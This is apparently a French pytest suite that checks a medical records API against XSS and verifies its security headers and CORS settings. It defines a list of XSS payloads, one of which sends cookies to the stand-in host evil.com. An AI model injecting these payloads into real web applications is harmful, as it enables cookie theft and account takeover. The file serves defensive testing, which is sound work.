"""
Tests de sécurité: prévention des attaques XSS.

Vérifie que l'application neutralise les scripts malveillants
dans les entrées utilisateur et inclut les headers de sécurité appropriés.
"""

import pytest
import pytest_asyncio
from httpx import AsyncClient


pytestmark = [pytest.mark.security, pytest.mark.asyncio]

# Payloads XSS classiques
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    "'-alert(1)-'",
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    '<details open ontoggle="alert(1)">',
]


class TestXSSInPatientName:
    """Tests XSS dans les noms de patients."""

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS[:5])
    async def test_xss_in_patient_name(
        self, client: AsyncClient, praticien_auth_headers: dict, xss_payload: str
    ) -> None:
        """Les scripts XSS dans le nom du patient sont neutralisés."""
        response = await client.post(
            "/api/v1/patients/",
            json={
                "first_name": xss_payload,
                "last_name": "Test",
                "date_of_birth": "1990-01-01",
                "social_security_number": "190011234567890",
                "phone": "+33600000000",
                "address": "1 Rue Test, 75001 Paris",
                "email": "xss.test.name@test.fr",
            },
            headers=praticien_auth_headers,
        )

        # Soit le payload est rejeté (400/422), soit il est accepté
        # mais le script ne doit PAS être exécutable dans la réponse
        if response.status_code in (200, 201):
            data = response.json()
            response_text = str(data)
            # Le script ne doit pas apparaître tel quel dans la réponse
            assert "<script>" not in response_text.lower() or \
                   "&lt;script&gt;" in response_text or \
                   "script" not in response_text.lower(), (
                f"Le payload XSS ne devrait pas être retourné tel quel: {response_text}"
            )
        # Si rejeté, c'est encore mieux
        assert response.status_code != 500, (
            f"Le payload XSS ne devrait pas causer une erreur serveur 500"
        )

    async def test_xss_in_patient_last_name(
        self, client: AsyncClient, praticien_auth_headers: dict
    ) -> None:
        """Les scripts XSS dans le nom de famille sont neutralisés."""
        response = await client.post(
            "/api/v1/patients/",
            json={
                "first_name": "Test",
                "last_name": '<script>alert("XSS")</script>',
                "date_of_birth": "1990-01-01",
                "social_security_number": "190011234567891",
                "phone": "+33600000001",
                "address": "1 Rue Test, 75001 Paris",
                "email": "xss.test.lastname@test.fr",
            },
            headers=praticien_auth_headers,
        )

        assert response.status_code != 500


class TestXSSInConsultationNotes:
    """Tests XSS dans les notes de consultation."""

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS[:5])
    async def test_xss_in_consultation_notes(
        self, client: AsyncClient, praticien_auth_headers: dict, xss_payload: str
    ) -> None:
        """Les scripts XSS dans les notes de consultation sont neutralisés."""
        response = await client.post(
            "/api/v1/consultations/",
            json={
                "patient_id": "00000000-0000-0000-0000-000000000000",
                "motif": "Test XSS",
                "notes": xss_payload,
                "diagnostic": "Test",
                "prescription": "Aucune",
            },
            headers=praticien_auth_headers,
        )

        # L'important: pas de 500 et pas d'exécution de script
        assert response.status_code != 500, (
            f"Le payload XSS dans les notes ne devrait pas causer d'erreur serveur"
        )

        if response.status_code in (200, 201):
            data = response.json()
            response_text = str(data)
            # Vérifier que le script n'est pas retourné de manière exécutable
            assert "<script>" not in response_text or \
                   response.headers.get("content-type", "").startswith("application/json"), (
                "Les notes avec XSS ne devraient pas être retournées de manière exécutable"
            )

    async def test_xss_in_diagnostic(
        self, client: AsyncClient, praticien_auth_headers: dict
    ) -> None:
        """Les scripts XSS dans le diagnostic sont neutralisés."""
        response = await client.post(
            "/api/v1/consultations/",
            json={
                "patient_id": "00000000-0000-0000-0000-000000000000",
                "motif": "Consultation",
                "notes": "Notes normales",
                "diagnostic": '<img src="x" onerror="alert(1)">',
                "prescription": "Aucune",
            },
            headers=praticien_auth_headers,
        )

        assert response.status_code != 500


class TestSecurityHeaders:
    """Tests des headers de sécurité HTTP."""

    async def test_security_headers_present(
        self, client: AsyncClient
    ) -> None:
        """Les headers de sécurité essentiels sont présents."""
        # Faire une requête quelconque
        response = await client.get("/api/v1/health")

        headers = response.headers

        # Content-Type devrait être JSON pour les API
        content_type = headers.get("content-type", "")
        if response.status_code == 200:
            assert "json" in content_type.lower() or "text" in content_type.lower(), (
                f"Le Content-Type devrait inclure json ou text: {content_type}"
            )

        # Vérifier les headers de sécurité recommandés
        security_headers_to_check = {
            "x-content-type-options": "nosniff",
            "x-frame-options": ["DENY", "SAMEORIGIN"],
        }

        for header_name, expected_values in security_headers_to_check.items():
            header_value = headers.get(header_name, "")
            if header_value:
                if isinstance(expected_values, list):
                    assert header_value.upper() in [v.upper() for v in expected_values], (
                        f"Header '{header_name}' a une valeur inattendue: {header_value}"
                    )
                else:
                    assert header_value.lower() == expected_values.lower(), (
                        f"Header '{header_name}': attendu '{expected_values}', "
                        f"obtenu '{header_value}'"
                    )

    async def test_cors_headers(self, client: AsyncClient) -> None:
        """Les headers CORS sont correctement configurés."""
        response = await client.options(
            "/api/v1/health",
            headers={
                "Origin": "http://evil-site.com",
                "Access-Control-Request-Method": "GET",
            },
        )

        # Un origin non autorisé ne devrait pas avoir access
        allow_origin = response.headers.get("access-control-allow-origin", "")
        if allow_origin:
            assert allow_origin != "*" or allow_origin == "", (
                "CORS ne devrait pas autoriser tous les origins (*) "
                "pour une application médicale"
            )

    async def test_no_server_header_leak(self, client: AsyncClient) -> None:
        """Le header Server ne divulgue pas d'informations sensibles."""
        response = await client.get("/api/v1/health")

        server_header = response.headers.get("server", "")
        if server_header:
            # Ne devrait pas contenir de versions détaillées
            assert "version" not in server_header.lower(), (
                f"Le header Server ne devrait pas divulguer la version: {server_header}"
            )
